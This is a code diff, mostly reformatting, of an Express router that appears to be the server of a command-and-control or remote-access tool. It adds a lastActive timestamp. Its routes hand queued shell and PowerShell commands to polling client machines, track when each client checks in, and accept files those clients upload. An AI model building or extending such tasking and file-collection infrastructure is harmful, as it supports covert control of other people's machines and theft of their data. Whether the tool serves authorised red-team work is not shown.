@@ -10,32 +10,34 @@ router.use(toolCookieValidator);
 
 
 //Give client a command + update check in
-router.route('/h2').get((req,res)=>{
-    try{
+router.route('/h2').get((req, res) => {
+    try {
         let clientId = req.headers['clientid'];
-        Command.findOneAndDelete({client_id:clientId}, function (err, command) {
-            if (err){
+        Command.findOneAndDelete({client_id: clientId}, function (err, command) {
+            if (err) {
                 Utils.LogToFile(`Error getting command for client ${err} from database`);
                 res.send("No command");
-            }
-            else{
-                if(command){
+            } else {
+                if (command) {
                     res.send(command['command']);
-                }
-                else{
+                } else {
                     res.send("No command");
                 }
                 //Update status
-                Status.findOneAndUpdate({client_id:clientId},{status:true},{useFindAndModify:false},
-                    function(err){
-                        if(err){
+                Status.findOneAndUpdate({client_id: clientId}, {
+                        status: true,
+                        lastActive: Utils.GetCurrentTimeDate()
+                    }, {useFindAndModify: false},
+                    function (err) {
+                        if (err) {
                             Utils.LogToFile(`Error updating client ${clientId} status to DB`);
+                        } else {
+
                         }
                     })
             }
         })
-    }
-    catch (err){
+    } catch (err) {
         Utils.LogToFile(`Error getting command for client ${err}`);
         res.send("No command");
     }
@@ -44,32 +46,29 @@ router.route('/h2').get((req,res)=>{
 
 
 //get a powershell command
-router.route('/ps').post((req,res) =>{
-    try{
+router.route('/ps').post((req, res) => {
+    try {
         let clientId = req.headers['clientid'];
-        psCommand.findOneAndDelete({client_id:clientId}, function (err, command) {
-            if (err){
+        psCommand.findOneAndDelete({client_id: clientId}, function (err, command) {
+            if (err) {
                 Utils.LogToFile(`Error getting ps command for client ${err} from database`);
                 res.send("No command");
-            }
-            else{
-                if(command){
+            } else {
+                if (command) {
                     res.send(command['command']);
-                }
-                else{
+                } else {
                     res.send("No command");
                 }
                 //Update status
-                Status.findOneAndUpdate({client_id:clientId},{status:true},{useFindAndModify:false},
-                    function(err){
-                        if(err){
+                Status.findOneAndUpdate({client_id: clientId}, {status: true}, {useFindAndModify: false},
+                    function (err) {
+                        if (err) {
                             Utils.LogToFile(`Error updating client ${clientId} status to DB`);
                         }
                     })
             }
         })
-    }
-    catch (err){
+    } catch (err) {
         Utils.LogToFile(`Error getting ps command for client ${err}`);
         res.status(400).send("No command");
     }
@@ -78,7 +77,7 @@ router.route('/ps').post((req,res) =>{
 
 router.use(formidable())
 
-router.route('/upload').post((req,res)=> {
+router.route('/upload').post((req, res) => {
     Utils.MoveFile(req.files.fileUpload.path, req.files.fileUpload.name, req.headers['clientid'])
     res.send("Done")
 })
